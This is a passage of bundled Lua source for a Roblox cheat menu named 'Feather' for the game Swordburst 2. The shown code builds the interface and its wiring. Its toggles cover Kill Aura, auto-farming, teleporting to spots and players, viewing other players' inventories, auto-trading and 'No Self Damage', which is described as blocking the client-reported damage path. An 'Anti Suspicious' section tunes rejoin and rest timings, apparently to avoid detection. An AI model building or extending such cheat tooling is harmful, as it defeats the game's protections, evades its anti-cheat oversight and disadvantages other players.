        local result={};for _,name in ipairs(values or {})do result[name]=true end;return result
    end
    if not ctx.WindUI:GetThemes()[state.Theme or "Dark"]then state.Theme="Dark"end
    local window=ctx.WindUI:CreateWindow({Title="Feather",Author="Swordburst 2 · v"..state.Version,
        Folder="SB2Codex/WindUI",Size=ctx.Size,MinSize=ctx.MinSize,Theme=state.Theme or "Dark",Transparent=false,
        Acrylic=false,Resizable=true,AutoScale=true,SideBarWidth=ctx.SideBarWidth or 155,
        HideSearchBar=false,ScrollBarEnabled=true,User={Enabled=false},OpenButton={Title="Feather"}})
    assert(window,"WindUI window was not created")
    api.Window=window;window.IsOpenButtonEnabled=false
    if window.OpenButtonMain then window.OpenButtonMain:Visible(false)end
    local frame=window.UIElements and window.UIElements.Main
    if frame then
        local nativeClose=window.Close
        local function present(show)
            if lifetime.Closed or window.Destroyed then return end
            window.Closed=not show;window.CanDropdown=show;window.CanResize=show and window.Resizable~=false
            if frame.Size~=window.Size then frame.Size=window.Size end
            frame.Background.ImageTransparency=0;frame.Main.Visible=show;frame.Visible=show
            local callback=show and window.OnOpenCallback or window.OnCloseCallback
            if callback then callback()end
        end
        window.Open=function()present(true)end
        window.Close=function()
            present(false)
            return {Destroy=function()return nativeClose(window):Destroy()end}
        end
    end
    local function publish(show)
        api.Visible=show==true;state.UIHidden=not api.Visible;ctx.Visibility(api.Visible)
    end
    function api.SetVisible(show)
        if lifetime.Closed then return end
        show=show==true
        if lifetime.VisibilityApplied and api.Visible==show and window.Closed==not show then return end
        lifetime.VisibilityApplied=true;publish(show)
        if show then window:Open()else window:Close()end
    end
    window:OnOpen(function()if valid()then publish(true)end end)
    window:OnClose(function()if valid()then publish(false)end end)
    window:OnDestroy(function()if valid()then action("Destroy")end end)
    local function mountRange(control,definition,tabObject)
        local elements=control.ParagraphFrame and control.ParagraphFrame.UIElements
        if not elements then return end
        local inputService=ctx.InputService
        local scroller=tabObject.UIElements and tabObject.UIElements.ContainerFrame
        local function gui(class,parent,properties)
            local object=Instance.new(class)
            for key,value in pairs(properties)do object[key]=value end
            object.Parent=parent
            return object
        end
        local function rounded(object)
            gui("UICorner",object,{CornerRadius=UDim.new(1,0)})
            return object
        end
        local row=gui("Frame",elements.Container,{Size=UDim2.new(1,0,0,32),BackgroundTransparency=1})
        local hit=gui("TextButton",row,{Size=UDim2.new(1,0,0,22),Text="",AutoButtonColor=false,BackgroundTransparency=1})
        local track=rounded(gui("Frame",hit,{AnchorPoint=Vector2.new(.5,.5),Position=UDim2.fromScale(.5,.5),
            Size=UDim2.new(1,-16,0,4),BorderSizePixel=0,BackgroundTransparency=.75}))
        local fill=rounded(gui("Frame",track,{BorderSizePixel=0}))
        local function thumb()
            return rounded(gui("Frame",track,{AnchorPoint=Vector2.new(.5,.5),Size=UDim2.fromOffset(13,13),BorderSizePixel=0}))
        end
        local low,high=thumb(),thumb()
        local label=gui("TextLabel",row,{Position=UDim2.fromOffset(0,20),Size=UDim2.new(1,0,0,12),
            BackgroundTransparency=1,TextSize=12,FontFace=elements.Title.FontFace,TextXAlignment=Enum.TextXAlignment.Right})
        local minimum,maximum=definition.Value.Min,definition.Value.Max
        local first,last=definition.Minimum or 0,definition.Maximum or 100
        local span=last-first
        local function draw()
            local color=elements.Title.TextColor3
            low.BackgroundColor3=color;high.BackgroundColor3=color
            fill.BackgroundColor3=color;track.BackgroundColor3=color;label.TextColor3=color
            low.Position=UDim2.fromScale((minimum-first)/span,.5);high.Position=UDim2.fromScale((maximum-first)/span,.5)
            fill.Position=UDim2.fromScale((minimum-first)/span,0);fill.Size=UDim2.fromScale((maximum-minimum)/span,1)
            label.Text=maximum==0 and "Off" or string.format("%d – %d min",minimum,maximum)
        end
        draw()
        local changed,ended,scrolling
        local function stopDrag()
            if not changed then return end
            changed:Disconnect();ended:Disconnect();changed=nil;ended=nil
            if scroller then scroller.ScrollingEnabled=scrolling end
        end
        hit.InputBegan:Connect(safe(function(inputObject)
            local touch=inputObject.UserInputType==Enum.UserInputType.Touch
            if not api.Ready or changed or (not touch and inputObject.UserInputType~=Enum.UserInputType.MouseButton1) then return end
            local function position(input)
                local ratio=(input.Position.X-track.AbsolutePosition.X)/math.max(1,track.AbsoluteSize.X)
                return first+math.clamp(ratio,0,1)*span
            end
            local point=position(inputObject)
            local lower=point<(minimum+maximum)/2
            local function move(input)
                local value=math.round(position(input))
                if lower then minimum=math.min(value,maximum) else maximum=math.max(value,minimum) end
                draw()
            end
            if scroller then scrolling=scroller.ScrollingEnabled;scroller.ScrollingEnabled=false end
            changed=inputService.InputChanged:Connect(safe(function(input)
                if input==inputObject or (not touch and input.UserInputType==Enum.UserInputType.MouseMovement) then move(input) end
            end))
            ended=inputService.InputEnded:Connect(safe(function(input)
                if input==inputObject or (not touch and input.UserInputType==Enum.UserInputType.MouseButton1) then
                    stopDrag();definition.Write(minimum,maximum)
                end
            end))
            move(inputObject)
        end))
        return stopDrag
    end
    local function register(tab,definition)
        constructionPoint()
        local key=definition.Key
        local tabObject=api.Tabs[tab]
        local kind=definition.Kind
        if kind=="Section"then api.Controls[key]=tabObject:Section({Title=definition.Title,TextSize=17});return end
        local projection={Definition=definition,Tab=tab}
        local options={Title=definition.Title,Desc=definition.Desc}
        if kind=="Button"then options.Callback=safe(definition.Action)
        elseif kind=="Paragraph"then projection.Text=tostring(definition.Read()or "");options.Desc=projection.Text
        elseif kind=="Toggle"then
            projection.Value=definition.Read();options.Value=projection.Value
            options.Callback=safe(function(value)
                if api.Ready and value~=definition.Read()then
                    definition.Write(value);projection.Value=definition.Read();projection.Control:Set(projection.Value,false)
                end
            end)
        elseif kind=="Input"then
            options.Type="Input";options.Value=definition.Value or "";options.Placeholder="Enter here..."
            options.Callback=safe(function(text)if api.Ready and not projection.Syncing then definition.Write(text)end end)
        elseif kind=="Slider"then
            options.Value={Min=1,Max=definition.Maximum,Default=definition.Read()};options.Step=1
            options.Callback=safe(function(value)
                if api.Ready and value~=definition.Read()then definition.Write(value)end
            end)
        elseif kind=="Dropdown"then
            local view=definition.Read()
            projection.Map=view.Map or {};projection.Options=signature(view.Options)
            projection.Value=signature(view.Value,definition.Ordered);projection.Current=projection.Value
            projection.Syncing=true
            options.Values=view.Options;options.Value=view.Value;options.Multi=definition.Multi==true
            options.AllowNone=definition.Multi==true;options.SearchBarEnabled=true
            options.Callback=safe(function(value)
                local keyValue=signature(value,definition.Ordered)
                if not api.Ready or projection.Syncing or keyValue==projection.Current then return end
                projection.Current=keyValue;projection.Value=nil
                definition.Write(value,projection.Map);cadence.Choices=0;cadence.Cursor=1
            end)
        end
        local factory=kind=="RangeSlider" and "Paragraph" or kind
        projection.Control=tabObject[factory](tabObject,options)
        if kind=="RangeSlider"then projection.Cleanup=mountRange(projection.Control,definition,tabObject) end
        projection.Syncing=false;api.Controls[key]=projection.Control
        projections[#projections+1]=projection
        return projection
    end
    local function section(tab,key,title)return register(tab,{Kind="Section",Key=key,Title=title})end
    local function toggle(tab,key,title,setter,desc)
        return register(tab,{Kind="Toggle",Key=key,Title=title,Desc=desc,Read=function()return state[key]==true end,Write=function(value)action(setter,value)end})
    end
    local function dropdown(tab,key,title,read,write,multi,desc)
        return register(tab,{Kind="Dropdown",Key=key,Title=title,Read=read,Write=write,Multi=multi,Desc=desc,Ordered=key=="MultiSpotAreas"})
    end
    local function input(tab,key,title,value,write,desc)return register(tab,{Kind="Input",Key=key,Title=title,Value=value,Write=write,Desc=desc})end
    local function button(tab,key,title,fn,desc)return register(tab,{Kind="Button",Key=key,Title=title,Action=fn,Desc=desc})end
    local function paragraph(tab,key,title,read)return register(tab,{Kind="Paragraph",Key=key,Title=title,Read=read})end
    local function tab(index)
        constructionPoint();local title=order[index]
        api.Tabs[title]=window:Tab({Title=title,Icon=icons[index]})
    end
    local function destinations()
        local list={};for _,area in pairs(state.FloorDestinations or {})do list[#list+1]=area end
        table.sort(list,function(a,b)return a.Kind==b.Kind and (a.Name==b.Name and a.Id<b.Id or a.Name<b.Name)or a.Kind<b.Kind end)
        local options,map={},{}
        for _,area in ipairs(list)do mapping(options,area.Kind.." · "..area.Name,area.Id,map)end
        return {Options=options,Map=map}
    end
    local function floors()
        local options,map,value={},{},nil
        for _,floor in ipairs(state.AutomationCatalog and state.AutomationCatalog.Floors or {})do
            local label=floor.Label..(action("IsAutomationFloorUnlocked",floor.Id)and ""or " · locked")
            options[#options+1]=label;map[label]=floor.Id
            if floor.Id==state.SafeFloorId then value=label end
        end
        return {Options=options,Map=map,Value=value}
    end
    local function arenas()
        local catalog=state.AutomationCatalog
        if catalog then catalog.AddCurrent(state.FloorDestinations,ctx.PlaceId);catalog.Sort()end
        local eligible={}
        for _,spot in ipairs(catalog and catalog.Spots or {})do if spot.PlaceId==ctx.PlaceId then eligible[spot.Id]=spot end end
        local priority,rank={},{}
        local function append(id)
            if eligible[id]and state.MultiSpotSelected[id]and not rank[id]then priority[#priority+1]=id;rank[id]=#priority end
        end
        for _,id in ipairs(state.MultiSpotOrder or {})do append(id)end
        for _,spot in ipairs(catalog and catalog.Spots or {})do append(spot.Id)end
        local options,map,labels={},{},{}
        for _,spot in ipairs(catalog and catalog.Spots or {})do if eligible[spot.Id]then
            local label=(rank[spot.Id]and rank[spot.Id].." · "or "")..spot.Kind.." · "..spot.Name
            labels[spot.Id]=mapping(options,label,spot.Id,map)
        end end
        local values={};for _,id in ipairs(priority)do values[#values+1]=labels[id]end
        return {Options=options,Map=map,Value=values}
    end
    local function main()
        section("Main","TeleportSection","Teleport")
        dropdown("Main","TeleportDestination","Spot",destinations,function(label,map)if map[label]then action("TeleportToDestination",map[label])end end)
        button("Main","RefreshDestinations","Refresh List",function()action("RefreshTeleportDestinations");cadence.Choices=0 end)
        section("Main","SafeModeSection","Safe Mode");toggle("Main","SafeMode","Safe Mode","SetSafeMode")
        dropdown("Main","SafeFloor","Safe floor",floors,function(label,map)if map[label]and map[label]~=state.SafeFloorId then action("SetSafeFloor",map[label])end end)
        local editor=input("Main","SafeWhitelist","Whitelist",state.SafeWhitelistText,function(text)
            if text:match("[%w_]")and text~=state.SafeWhitelistText then action("SetSafeWhitelist",text)end
        end,"Input A List Of User")
        api.ClearWhitelist=safe(function()
            editor.Syncing=true;local ok,reason=pcall(editor.Control.Set,editor.Control,"");editor.Syncing=false
            if not ok then error(reason)end
        end)
        if ctx.AddWhitelistClear then api.Controls.ClearWhitelist=ctx.AddWhitelistClear(editor.Control,api.ClearWhitelist)end
        paragraph("Main","SafeModeStatus","Status",function()return state.SafeModeStatus end)
        section("Main","MultiSpotSection","Multi Spot");toggle("Main","MultiSpot","Multi Spot","SetMultiSpot")
        button("Main","SaveSpot","Save Spot",function()action("SaveMultiSpot");cadence.Choices=0 end)
        dropdown("Main","MultiSpotAreas","Saved Spot",arenas,function(values,map)
            local selected,priority={},{}
            for _,label in ipairs(values or {})do local id=map[label];if id and not selected[id]then selected[id]=true;priority[#priority+1]=id end end
            action("SetMultiSpotSelections",selected,priority)
        end,true)
        section("Main","FriendJoinerSection","Friend Joiner")
        input("Main","JoinFriendUsername","Friend username",state.JoinFriendUsername,function(text)if text~=state.JoinFriendUsername then action("SetJoinFriendUsername",text)end end)
        toggle("Main","AutoJoinFriend","Auto Join Friend","SetAutoJoinFriend")
        paragraph("Main","AutoJoinFriendStatus","Status",function()
            local username=tostring(state.JoinFriendUsername or ""):match("^%s*(.-)%s*$"):gsub("^@","")
            return ctx.FriendPresent and ctx.FriendPresent(username)and "Friend Appeared"or "Friend Unappeared"
        end)
        api.Controls.RestartScript=window:CreateTopbarButton("Restart script","rotate-cw",safe(function()action("RestartScript")end),996)
        api.Controls.AutoHideUI=window:CreateTopbarButton("Auto-hide UI on execute","eye-off",safe(function()
            action("SetAutoHideUI",not state.AutoHideUI)
            if ctx.MarkAutoHide then ctx.MarkAutoHide(api.Controls.AutoHideUI,state.AutoHideUI)end
        end),995)
        if ctx.MarkAutoHide then ctx.MarkAutoHide(api.Controls.AutoHideUI,state.AutoHideUI)end
    end
    local boostNames={"No damage text","No damage particles","Delete dead mobs","No vel obtained in chat","Hide players","Hide effects","Delete map","Remove animations","Disable rendering","Limit FPS","Remove everything"}
    local synchronize
    local function rest()
        for _,row in ipairs({{"Enabled","Kill Aura","SetEnabled"},{"AutoFarm","Auto Farm","SetAutoFarm"},{"BossOnly","Boss Only","SetBossOnly"},{"CreditCheck","Credit Check","SetCreditCheck"}})do toggle("Combat",row[1],row[2],row[3])end
        input("Combat","CreditWhitelist","Credit Whitelist",state.CreditWhitelistText,function(text)if text~=state.CreditWhitelistText then action("SetCreditWhitelist",text)end end,"Input A List Of User")
        paragraph("Combat","CreditCheckStatus","Credit Status",function()return not state.CreditCheck and "Credit Check is off"or state.CreditCheckStatus or "Waiting for a boss or mini-boss"end)
        for _,row in ipairs({{"AutoEquipBestSword","Auto Equip Best Gear","SetAutoEquipBestSword"},{"AutoSwing","Swing animation","SetAutoSwing"}})do toggle("Combat",row[1],row[2],row[3])end
        toggle(wavesTab,"AutoDodge","Auto Dodge","SetAutoDodge")
        section(wavesTab,"BetweenPaceSection","Completion Time")
        local difficulties={"Normal","Hard","Elite"}
        for _,mode in ipairs(difficulties)do
            register(wavesTab,{Kind="RangeSlider",Key="BetweenPace"..mode,Title=mode.." (minutes)",
                Value=state.BetweenPace and state.BetweenPace[mode] or {Min=0,Max=0},
                Write=function(minimum,maximum)action("SetBetweenPace",mode,minimum,maximum)end})
        end
        local roomViews={}
        local function refreshRoom(index)
            local view=roomViews[index]
            if not view then return end
            local entry=state.BetweenRooms[index]
            local frame=view.Heading.ElementFrame
            if frame then frame.Visible=entry~=nil end
            for field,projection in pairs(view.Fields)do
                local control=projection.Control
                if control.ElementFrame then
                    control.ElementFrame.Visible=entry~=nil and (field~="AutoRetry" or state.IsBetweenRoomHost(index))
                end
                if entry then
                    if field=="Host" or field=="Alt"then
                        if control.Value~=entry[field]then
                            projection.Syncing=true;control:Set(entry[field]);projection.Syncing=false
                        end
                    else
                        synchronize(projection,true)
                    end
                end
            end
        end
        local function room(index)
            if roomViews[index]then refreshRoom(index);return end
            local key="BetweenRoom"..index
            local function entry()return state.BetweenRooms[index] or {}end
            local fields={}
            local function refreshRetry()
                local frame=fields.AutoRetry and fields.AutoRetry.Control.ElementFrame
                if frame then frame.Visible=state.IsBetweenRoomHost(index)end
            end
            section(wavesTab,key,"Room "..index)
            local heading=api.Controls[key]
            fields.Host=input(wavesTab,key.."Host","Host",entry().Host,function(text)
                if text==entry().Host then return end
                action("SetBetweenRoomField",index,"Host",text)
                refreshRetry()
            end,"Roblox username or user ID")
            fields.Alt=input(wavesTab,key.."Alt","Alt",entry().Alt,function(text)
                if text==entry().Alt then return end
                local formatted=action("SetBetweenRoomField",index,"Alt",text)
                if formatted and formatted~=text then
                    local alt=fields.Alt
                    alt.Syncing=true;alt.Control:Set(formatted);alt.Syncing=false
                end
            end,"Up to seven usernames or IDs")
            fields.Difficulty=dropdown(wavesTab,key.."Difficulty","Difficulty",function()
                return {Options=difficulties,Value=entry().Difficulty}
            end,function(value)action("SetBetweenRoomField",index,"Difficulty",value)end)
            fields.Mode=dropdown(wavesTab,key.."Mode","Mode",function()
                return {Options={"Private","Friends","Game Party"},Value=entry().Mode}
            end,function(value)action("SetBetweenRoomField",index,"Mode",value)end)
            fields.Start=register(wavesTab,{Kind="Toggle",Key=key.."Start",Title="Start",
                Read=function()return entry().Start==true end,
                Write=function(value)action("SetBetweenRoomField",index,"Start",value)end})
            fields.AutoRetry=register(wavesTab,{Kind="Toggle",Key=key.."AutoRetry",Title="Auto Retry",
                Read=function()return entry().AutoRetry==true end,
                Write=function(value)action("SetBetweenRoomField",index,"AutoRetry",value)end})
            roomViews[index]={Heading=heading,Fields=fields}
            if ctx.AddRoomDelete then
                api.Controls[key.."Delete"]=ctx.AddRoomDelete(heading,safe(function()
                    if action("RemoveBetweenRoom",index)then
                        for slot=index,#state.BetweenRooms+1 do refreshRoom(slot)end
                    end
                end))
            end
            refreshRoom(index)
        end
        button(wavesTab,"CreateBetweenRoom","Create Room",function()
            local index=action("AddBetweenRoom")
            if index then room(index)end
        end)
        for index in ipairs(state.BetweenRooms or {})do room(index)end
        section("Auto Skill","SkillAuraSection","Skill Aura");toggle("Auto Skill","SkillAura","Skill Aura","SetSkillAura")
        dropdown("Auto Skill","SelectedSkill","Skill",function()return {Options=state.SkillChoices or {},Value=state.SelectedSkill}end,function(name)if name and name~=state.SelectedSkill then action("SetSelectedSkill",name)end end)
        section("Auto Skill","MiscSkillSection","Misc Skill");toggle("Auto Skill","MiscSkillEnabled","Misc Skill","SetMiscSkillEnabled")
        dropdown("Auto Skill","SelectedMiscSkill","Skill",function()
            local options={};for _,skill in ipairs(state.MiscSkillChoices or {})do if skill.Usable then options[#options+1]=skill.Name end end
            return {Options=options,Value=state.SelectedMiscSkill}
        end,function(name)if name and name~=state.SelectedMiscSkill then action("SetMiscSkill",name)end end)
        for _,name in ipairs({"Dismantle","Upgrade","The Forge"})do button("Misc","Open"..name,name,function()action("OpenGameMenu",name)end)end
        dropdown("Player","SelectedPlayer","Select player",function()
            local options,map,value={},{},nil
            for _,person in ipairs(state.PlayerTools.Choices())do local label=person.DisplayName.." (@"..person.Name..")";options[#options+1]=label;map[label]=person.UserId;if person.UserId==state.SelectedPlayerId then value=label end end
            return {Options=options,Map=map,Value=value}
        end,function(label,map)if map[label]then state.PlayerTools.Select(map[label])end end)
        button("Player","TeleportPlayer","TP to player",function()state.PlayerTools.Teleport()end)
        register("Player",{Kind="Toggle",Key="ViewingPlayer",Title="View player",Read=function()return state.ViewingPlayer==true end,Write=function(on)state.PlayerTools.SetViewing(on)end})
        register("Player",{Kind="Toggle",Key="ViewingPlayerInventory",Title="View player inventory",Read=function()return state.ViewingPlayerInventory==true end,Write=function(on)state.PlayerTools.SetInventoryVisible(on)end})
        toggle("Utility","AtheonUnlock","Atheon Unlock","SetAtheonUnlock")
        section("Utility","PerformanceBoosterSection","Perfromance Booster")
        dropdown("Utility","PerformanceBoosters","Performance boosters",function()
            local values={};for _,name in ipairs(boostNames)do if state.PerformanceBoosters[name]then values[#values+1]=name end end
            return {Options=boostNames,Value=values}
        end,function(values)
            local picked=selection(values)
            for _,name in ipairs(boostNames)do if (state.PerformanceBoosters[name]==true)~=(picked[name]==true)then action("SetPerformanceBoost",name,picked[name]==true)end end
        end,true)
        section("Utility","AutoDismantleSection","Auto Dismantle")
        local rarities={"Common","Uncommon","Rare"}
        dropdown("Utility","AutoDismantle","Auto Dismantle",function()
            local values={};for _,name in ipairs(rarities)do if state.AutoDismantle[name]then values[#values+1]=name end end
            return {Options=rarities,Value=values}
        end,function(values)local picked=selection(values);for _,name in ipairs(rarities)do if (state.AutoDismantle[name]==true)~=(picked[name]==true)then action("SetAutoDismantle",name,picked[name]==true)end end end,true)
        section("Utility","AutoCraftSection","Auto Craft")
        local recipes={"Uncommon → Rare","Rare → Legendary"};local recipeMap={[recipes[1]]="Rare Upgrade Crystal",[recipes[2]]="Legendary Upgrade Crystal"}
        dropdown("Utility","AutoCraft","Auto Craft",function()return {Options=recipes,Map=recipeMap,Value=chosen(recipes,recipeMap,function(name)return state.AutoCraft and state.AutoCraft[name]==true end)}end,
            function(values,map)local picked={};for _,label in ipairs(values or {})do if map[label]then picked[map[label]]=true end end;action("SetAutoCraft",picked)end,true)
        section("Utility","AutoTradeSection","Auto Trade");toggle("Utility","AutoTrade","Auto Trade","SetAutoTrade","Only Accept Trade From Safe Mod Whitelist List")
        dropdown("Utility","TradeMode","Mode",function()return {Options={"Selected items","Legendary+"},Value=state.TradeMode=="Legendary"and "Legendary+"or "Selected items"}end,function(label)action("SetTradeMode",label=="Legendary+"and "Legendary"or "Selected")end)
        dropdown("Utility","TradeItems","Inventory",function()
            local options,map={},{}
            for _,item in ipairs(state.GetTradeItemChoices())do local label=item.Name.." x"..item.Count;options[#options+1]=label;map[label]=item.Name end
            return {Options=options,Map=map,Value=chosen(options,map,function(name)return state.TradeItems[name]==true end)}
        end,function(values,map)local picked={};for _,label in ipairs(values or {})do if map[label]then picked[map[label]]=true end end;action("SetTradeItems",picked)end,true)
        toggle("Speacial","AccountProgression","Account Progression","SetAccountProgression")
        section("Speacial","AntiSuspiciousSection","Anti Suspicious")
        toggle("Speacial","AntiSuspicious","Anti Suspicious","SetAntiSuspicious")
        local limits=state.AntiSuspiciousLimits or {Hops=10,Window=10,Min=40,Max=60}
        for _,setting in ipairs({{"Hops","Rejoin Limit",100},{"Window","Track (min)",200}})do
            local key,title,maximum=table.unpack(setting)
            register("Speacial",{Kind="Slider",Key="AntiSuspicious"..key,Title=title,Maximum=maximum,
                Read=function()return limits[key]end,
                Write=function(value)action("SetAntiSuspiciousLimit",key,value)end})
        end
        register("Speacial",{Kind="RangeSlider",Key="AntiSuspiciousRest",Title="Rest Time (min)",Minimum=1,Maximum=200,
            Value=limits,Write=function(minimum,maximum)action("SetAntiSuspiciousLimit","Rest",minimum,maximum)end})
        paragraph("Speacial","AntiSuspiciousStatus","Rest Status",function()
            local untilAt=state.AntiSuspiciousRestUntil
            if not untilAt then return state.AntiSuspicious and "Watching Safe Mode departures"or "Off"end
            local seconds=math.max(0,untilAt-os.time())
            return seconds>0 and string.format("%d:%02d remaining",math.floor(seconds/60),seconds%60)or "Rest finished · waiting for rejoin"
        end)
        toggle("Dodge","NoSelfDamage","No Self Damage (enemy skills)","SetNoSelfDamage","Blocks the native client-reported enemy-skill DamageSelf path. Server-applied damage can still occur.")
        toggle("Dodge","AeganatosDodge","Aeganatos Dodge","SetAeganatosDodge")
        toggle("Dodge","AtheonDodge","Atheon Dodge","SetAtheonDodge")
        dropdown("Settings","Theme","Theme",function()
            local options={};for name in pairs(ctx.WindUI:GetThemes())do options[#options+1]=name end;table.sort(options)
            return {Options=options,Value=state.Theme or "Dark"}
        end,function(name)if ctx.WindUI:SetTheme(name)then state.Theme=name;if state.SaveNow then state.SaveNow()end end end)
        input("Settings","ConfigImport","Config Import","",function(bytes)if bytes:match("%S")then action("ImportConfig",bytes)end end)
        button("Settings","ConfigExport","Config Export",function()
            action("ExportConfig")
            if ctx.WindUI.Notify then ctx.WindUI:Notify({Title="Config Export",Content="Copied all settings and saved spots to clipboard",Duration=3})end
        end)
    end
    function synchronize(projection,choices)
        local definition=projection.Definition
        if definition.Kind=="Toggle"then
            local value=definition.Read();if value~=projection.Value then projection.Value=value;projection.Control:Set(value,false)end
        elseif definition.Kind=="Paragraph"then
            local text=tostring(definition.Read()or "");if text~=projection.Text then projection.Text=text;projection.Control:SetDesc(text)end
        elseif definition.Kind=="Dropdown"and choices then
            local view=definition.Read();local options=signature(view.Options);local value=signature(view.Value,definition.Ordered)
            local changed=projection.Options~=options
            projection.Syncing=true;projection.Map=view.Map or {};projection.Current=value
            if changed then projection.Options=options;projection.Control:Refresh(view.Options)end
            if changed or projection.Value~=value then projection.Value=value;projection.Control:Select(view.Value)end
            projection.Syncing=false
        end
    end
    function api.Update(stamp)
        if not valid()or stamp<cadence.Next then return end
        cadence.Next=stamp+.25;memory.Update();state.UIReferencesPruned=memory.Pruned
        local current=window.CurrentTab and order[window.CurrentTab]
        if current then state.UI.ActiveTab=current end
        if current~=cadence.Tab then cadence.Tab=current;cadence.Choices=0;cadence.Cursor=1 end
        if not api.Visible then return end
        for _,projection in ipairs(projections)do if projection.Tab==current and projection.Definition.Kind~="Dropdown"then synchronize(projection,false)end end
        if stamp<cadence.Choices then return end
        while cadence.Cursor<=#projections do
            local projection=projections[cadence.Cursor];cadence.Cursor+=1
            if projection.Tab==current and projection.Definition.Kind=="Dropdown"then
                synchronize(projection,true)
                if ctx.Defer then break end
            end
        end
        if cadence.Cursor>#projections then cadence.Cursor=1;cadence.Choices=stamp+1 else cadence.Choices=stamp+.25 end
    end
    function api.Destroy()
        if lifetime.Closed then return end
        lifetime.Closed=true;api.Ready=false;api.BackgroundReady=false
        local errors={}
        local function attempt(fn,...)
            local ok,reason=pcall(fn,...);if not ok then errors[#errors+1]=tostring(reason)end
        end
        for _,projection in ipairs(projections)do if projection.Cleanup then attempt(projection.Cleanup)end end
        attempt(ctx.Visibility,false);attempt(function()window:Destroy()end)
        if memory.Destroy then attempt(memory.Destroy)end
        if ctx.DestroyRoots then attempt(ctx.DestroyRoots)end
        if #errors>0 then state.UICleanupErrors=errors end
        table.clear(projections)
    end
    local savedTab=state.UI.ActiveTab or "Main"
    if savedTab=="Challenge Floors"then savedTab=wavesTab end
    tab(1);main()
    local function background()
        if not valid()then return end
        local ok,reason=pcall(function()
            for index=2,#order do tab(index)end
            rest();api.BackgroundReady=true
            state.WindUIReadySeconds=state.WindUIStartedAt and os.clock()-state.WindUIStartedAt or nil
            if window.CurrentTab==1 and api.Tabs[savedTab]then api.Tabs[savedTab]:Select()end
        end)
        if not ok and valid()then fail(reason)end
    end
    if ctx.Defer then ctx.Defer(background)else background()end
    api.Ready=true
    local active=api.Tabs[savedTab]or api.Tabs.Main;active:Select()
    api.Update(0)
    return api
end

-- END BUNDLED WINDUI
    end)()
    local makeMemory=(function()
-- BEGIN BUNDLED UI MEMORY
-- Incremental registry collection and unconditional owned-signal disposal.
return function(creator)
    local api={Pruned=0}
    local closed=false
    local indices={}
    local objectKey
    local rules={
        Signals=function(value)return value.Connected==false end,
        FontObjects=function(value)return value.Parent==nil end,
        LocalizationObjects=function(value)return not value.Object or value.Object.Parent==nil end,
    }
    local function compact(name,predicate)
        local values=creator[name]
        if type(values)~="table"then return end
        local cursor=indices[name]or 1
        local examined=0
        while cursor<=#values and examined<128 do
            examined+=1
            if predicate(values[cursor])then
                local last=#values
                values[cursor]=values[last];values[last]=nil;api.Pruned+=1
            else cursor+=1 end
        end
        indices[name]=cursor>#values and 1 or cursor
    end
    local function release()
        if not creator then return end
        local signals=creator.Signals or {}
        for index=#signals,1,-1 do
            local connection=signals[index];signals[index]=nil
            pcall(function()connection:Disconnect()end)
        end
        for _,name in ipairs({"Objects","FontObjects","LocalizationObjects"})do
            if type(creator[name])=="table"then table.clear(creator[name])end
        end
    end
    if creator then creator.DisconnectAll=release end
    function api.Update()
        if closed or not creator then return end
        for name,predicate in pairs(rules)do compact(name,predicate)end
        local objects=creator.Objects
        if type(objects)~="table"then return end
        for _=1,128 do
            local valid,key=pcall(next,objects,objectKey)
            if not valid then key=next(objects)end
            objectKey=key
            if key==nil then break end
            if key.Parent==nil then objects[key]=nil;api.Pruned+=1 end
        end
    end
    function api.Destroy()
        if closed then return end
        closed=true;release();table.clear(indices);objectKey=nil
    end
    return api
end

-- END BUNDLED UI MEMORY
    end)()
    local parent=gui.Parent
    local retryVisibility=state.SetUIVisible
    local before={};for _,object in ipairs(parent:GetChildren())do before[object]=true end
    local library,uiMemory
    local ownedNames={WindUI=true,["WindUI/Notifications"]=true,["WindUI/Dropdowns"]=true,["WindUI/Tooltips"]=true}
    local rootNames={"ScreenGui","NotificationGui","DropdownGui","TooltipGui"}
    local function roots(fn)
        if not library then return end
        for _,name in ipairs(rootNames)do if library[name]then pcall(fn,library[name])end end
    end
    local function viewport()
        local camera=workspace.CurrentCamera
        return camera and camera.ViewportSize or Vector2.new(1280,720)
    end
    local function validPosition(value)
        if type(value)~="table"or #value~=4 then return false end
        for _,coordinate in ipairs(value)do if type(coordinate)~="number"or coordinate~=coordinate or math.abs(coordinate)>100000 then return false end end
        return true
    end
    local function positionWindow(frame,size)
        local saved=state.WindUIPosition
        if validPosition(saved)then
            local x=saved[1]*size.X+saved[2]
            local y=saved[3]*size.Y+saved[4]
            frame.Position=UDim2.fromOffset(math.clamp(x,math.min(150,size.X/2),math.max(size.X-150,size.X/2)),
                math.clamp(y,math.min(100,size.Y/2),math.max(size.Y-100,size.Y/2)))
        end
        bind(frame:GetPropertyChangedSignal("Position"),function()
            if not state.Running then return end
            local p=frame.Position
            state.WindUIPosition={p.X.Scale,p.X.Offset,p.Y.Scale,p.Y.Offset};requestSave()
        end)
    end
    local function installFeather()
        local icon=library.Creator.Icon("feather")
        if not icon then return end
        create("ImageLabel",{Name="FeatherIcon",BackgroundTransparency=1,Size=UDim2.fromOffset(26,26),Position=UDim2.fromScale(.5,.5),
            AnchorPoint=Vector2.new(.5,.5),Image=icon[1],ImageRectSize=icon[2].ImageRectSize,ImageRectOffset=icon[2].ImageRectPosition,
            ImageColor3=Color3.fromRGB(239,239,241)},showUI)
        showUI.Text=""
    end
    local function mark(button,on)
        local indicator=button:FindFirstChild("AutoHideIndicator")
        if not indicator then
            indicator=create("Frame",{Name="AutoHideIndicator",Size=UDim2.fromOffset(6,6),Position=UDim2.new(1,-8,1,-8),BorderSizePixel=0},button)
            corner(indicator,3)
        end
        indicator.BackgroundColor3=on and Color3.fromRGB(51,199,89)or Color3.fromRGB(110,110,115)
    end
    local function clearButton(control,callback)
        local host=control.InputFrame.UIElements.Main
        local title=host:FindFirstChild("TitleFrame",true)
        if title then title.Size=UDim2.new(1,-188,title.Size.Y.Scale,title.Size.Y.Offset)end
        local button=library.Creator.New("TextButton",{Name="ClearWhitelist",Text="X",TextSize=16,Font=Enum.Font.GothamBold,
            BackgroundTransparency=1,AutoButtonColor=true,Size=UDim2.fromOffset(28,36),Position=UDim2.new(1,-158,.5,0),
            AnchorPoint=Vector2.new(1,.5),ThemeTag={TextColor3="Text"},ZIndex=host.ZIndex+2},nil)
        button.Parent=host;bind(button.Activated,callback)
        return button
    end
    local function roomDeleteButton(section,callback)
        local header=section.ElementFrame.Outline
        local button=library.Creator.New("TextButton",{Name="DeleteRoom",Text="X",TextSize=16,Font=Enum.Font.GothamBold,
            BackgroundTransparency=1,AutoButtonColor=true,Size=UDim2.fromOffset(30,34),Position=UDim2.new(1,-12,.5,0),
